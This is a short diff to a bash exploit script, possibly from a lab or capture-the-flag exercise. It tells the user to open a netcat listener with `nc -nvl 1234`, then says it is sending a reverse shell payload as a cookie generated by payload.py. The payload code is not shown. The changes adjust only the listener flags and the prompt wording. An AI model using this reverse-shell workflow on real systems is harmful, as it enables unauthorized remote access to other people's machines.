@@ -41,8 +41,9 @@ while [ true ] ; do
     fi
 done
 
-echo "Step 3: In a new terminal, open a new connection to your internal port: \`nc -nvlk 1234\`"
-echo "Press any key when you did, to continue"
+echo "Step 3: In a new terminal, open a new connection to your internal port: \`nc -nvl 1234\`"
+echo "You might need to add the -p option if you're working inside a VM."
+echo "Press any key to continue if you've done this."
 echo
 while [ true ] ; do
     read -n 1
@@ -50,7 +51,6 @@ while [ true ] ; do
         break ;
     fi
 done
-
 
 echo "Now I am sending the reverse shell payload, check the \`nc\` terminal..."
 cookie_payload=`python3 ./payload.py`
